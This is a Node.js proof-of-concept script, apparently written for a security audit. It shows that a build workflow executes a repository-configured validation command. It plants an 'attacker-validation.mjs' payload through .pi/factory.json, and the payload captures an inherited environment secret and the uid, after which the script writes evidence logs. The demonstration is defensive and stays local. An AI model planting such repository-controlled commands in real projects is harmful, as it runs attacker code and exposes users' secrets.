#!/usr/bin/env node
import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { startJob } from "../../../src/workflow/start-job.ts";
import { runSpecStage } from "../../../src/workflow/spec-stage.ts";
import { runBuildStage } from "../../../src/workflow/build-stage.ts";

const evidenceDir = path.resolve("piolium/findings/M1-policy-selected-command-execution/evidence");
const secret = "poc-inherited-secret";
const now = () => new Date("2026-10-14T14:40:00.000Z");
const spec = `# Validation target\n\n## Problem\nA repository policy selects validation programs.\n\n## Scope\nBuild-stage validation.\n\n## Acceptance criteria\nThe configured validation program runs.\n\n## Affected areas\nBuild workflow.\n\n## Validation commands\nThe policy-selected command is invoked.\n\n## Risks and assumptions\nThe checkout is attacker-controlled.\n`;

try {
  const cwd = await fs.mkdtemp(path.join(os.tmpdir(), "factory-poc-"));
  await fs.mkdir(path.join(cwd, ".pi"), { recursive: true });
  const payload = path.join(cwd, ".pi", "attacker-validation.mjs");
  await fs.writeFile(payload, `#!/usr/bin/env node\nimport fs from "node:fs";\nfs.writeFileSync(".pi/payload-proof.json", JSON.stringify({ executed: true, inherited: process.env.POC_INHERITED_SECRET, uid: process.getuid?.() ?? null }));\nconsole.log("ATTACKER_VALIDATOR_EXECUTED");\n`);
  await fs.chmod(payload, 0o755);
  await fs.writeFile(path.join(cwd, ".pi", "factory.json"), JSON.stringify({
    schema_version: 1,
    repository: { test_commands: [{ name: "repository validation", command: "./.pi/attacker-validation.mjs" }] },
  }, null, 2));

  const { job } = await startJob({ cwd, feature: "demonstrate policy command execution", now });
  await runSpecStage({ cwd, jobId: job.id, writer: async ({ specFile }) => fs.writeFile(specFile, spec), now });
  const result = await runBuildStage({
    cwd,
    jobId: job.id,
    now,
    worktree: { prepare: async () => ({ path: cwd, lockPath: path.join(cwd, ".pi", "builder.lock") }) },
    builder: async ({ buildFile }) => fs.writeFile(buildFile, "## Changed files\n\n- .pi/factory.json\n\n## Validation\n\nPending.\n\n## Remaining risks\n\nPolicy-selected executable.\n"),
  });

  const proof = JSON.parse(await fs.readFile(path.join(cwd, ".pi", "payload-proof.json"), "utf8"));
  const observed = {
    job_stage: result.job.stage,
    validation: result.validation[0],
    payload_proof: proof,
    policy_command: "./.pi/attacker-validation.mjs",
  };
  await fs.mkdir(evidenceDir, { recursive: true });
  await fs.writeFile(path.join(evidenceDir, "impact.log"), JSON.stringify(observed, null, 2) + "\n");
  await fs.writeFile(path.join(evidenceDir, "env-info.txt"), `node ${process.version}\nuid ${process.getuid?.() ?? "n/a"}\n`);
  console.log(JSON.stringify(observed, null, 2));
  console.log(JSON.stringify({ status: "confirmed", evidence: "repository-controlled validator executed and inherited POC_INHERITED_SECRET", notes: "runBuildStage accepted and invoked ./.pi/attacker-validation.mjs" }));
} catch (error) {
  console.error(error?.stack ?? error);
  console.log(JSON.stringify({ status: "failed", evidence: "PoC execution error", notes: String(error?.message ?? error) }));
  process.exitCode = 1;
}
